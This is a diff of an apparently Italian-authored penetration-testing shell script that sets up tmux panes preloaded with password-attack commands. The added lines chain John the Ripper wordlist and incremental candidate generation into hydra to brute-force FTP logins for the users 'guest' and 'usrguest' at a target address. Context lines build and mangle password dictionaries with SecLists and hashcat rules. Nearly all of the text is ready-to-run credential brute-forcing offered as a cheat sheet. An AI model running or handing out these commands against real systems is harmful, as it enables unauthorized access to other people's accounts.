@@ -3095,6 +3095,12 @@ tmux select-pane -t "2.10"
 tmux split-window -h -t "2.10"
 tmux split-window -h -t "2.10"
 tmux split-window -h -t "2.10"
+tmux split-window -v -t PT:2.14
+tmux select-pane -t "2.14"
+tmux split-window -h -t "2.14"
+tmux split-window -h -t "2.14"
+tmux split-window -h -t "2.14"
+tmux split-window -h -t "2.14"
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:2.0 "# WEB Password Enumeration: Create Dictionary - find dictionary from predefined dictionaries" Enter
 tmux send-keys -t PT:2.0 "find /usr/share/seclists/ | grep pass | xargs wc -l | sort -n"
@@ -3124,8 +3130,16 @@ tmux send-keys -t PT:2.12 "# WEB Password Enumeration: Operate on dictionaries -
 tmux send-keys -t PT:2.12 "for i in \$(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; echo ${i}\!; done > newpwlist.txt"
 tmux send-keys -t PT:2.13 "# WEB Password Enumeration: Operate on dictionaries - manipulate words with hashcat" Enter
 tmux send-keys -t PT:2.13 "hashcat --force --stdout passwords.txt --stdout -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule > newpasswords.txt | awk 'length($0) > 7' > newpasswords2.txt"
-tmux send-keys -t PT:2.14 "# " Enter
-tmux send-keys -t PT:2.14 ""
+tmux send-keys -t PT:2.14 "# WEB Password Enumeration: dictionary passed on the fly - john create incremental dictionary" Enter
+tmux send-keys -t PT:2.14 "john --stdout --incremental --session=sessioneSalvata | xargs -L 1  hydra -V -l guest ftp://$ip -p"
+tmux send-keys -t PT:2.15 "# WEB Password Enumeration: dictionary passed on the fly - john restore session" Enter
+tmux send-keys -t PT:2.15 "john --restore=sessioneSalvata | xargs -L 1  hydra -V -l guest ftp://$ip -p"
+tmux send-keys -t PT:2.16 "# WEB Password Enumeration: dictionary passed on the fly - john pass one dictionary" Enter
+tmux send-keys -t PT:2.16 "john -w=myDictionary.txt --session=sessioneSalvata --stdout | xargs -L 1  hydra -V -l usrguest ftp://$ip -p"
+tmux send-keys -t PT:2.17 "# WEB Password Enumeration: dictionary passed on the fly - john pass multiple wordlists" Enter
+tmux send-keys -t PT:2.17 "sudo find /usr/share/seclists/ | grep passw | grep .txt | grep -v Agent | xargs -t  -I% john --session=sessioneSalvata --wordlist=% --stdout | xargs -L 1  hydra -V -l usrguest ftp://$ip -p"
+tmux send-keys -t PT:2.18 "# WEB Password Enumeration: dictionary passed on the fly - john pass multiple wordlists and applies its rule" Enter
+tmux send-keys -t PT:2.18 "sudo find /usr/share/seclists/ | grep assword | grep .txt | grep -v Agent | xargs -t  -I% john --rules:single --session=attack1 --wordlist=% --stdout | xargs -L 1  hydra -V -l usrguest ftp://$ip -p"
 cd $folderProject
 
 
